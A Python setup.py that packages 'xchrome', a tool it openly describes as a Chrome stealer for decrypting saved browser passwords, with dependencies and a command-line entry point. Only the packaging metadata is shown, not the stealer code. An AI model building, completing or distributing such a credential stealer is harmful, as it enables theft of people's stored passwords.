#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""Setup for chrome stealer."""

from setuptools import setup, find_packages


INSTALL_REQUIRES = [
   'cryptography',
   'pywin32',
   'pillow',
   'pycryptodome'
]

setup(
    name='xchrome',
    version='1.0.0',
    description='Steal chrome information.',
    long_description='Decrypto chrome saved passwords..',
    license='Dexy License',
    author='Dexy',
    keywords='chrome, stealer, decrypter, dexy',
    install_requires=INSTALL_REQUIRES,
    include_package_data=True,
    zip_safe=False,
	packages=find_packages(),
    py_modules=['xchrome'],
    entry_points={'console_scripts': ['xchrome = xchrome:main']},
)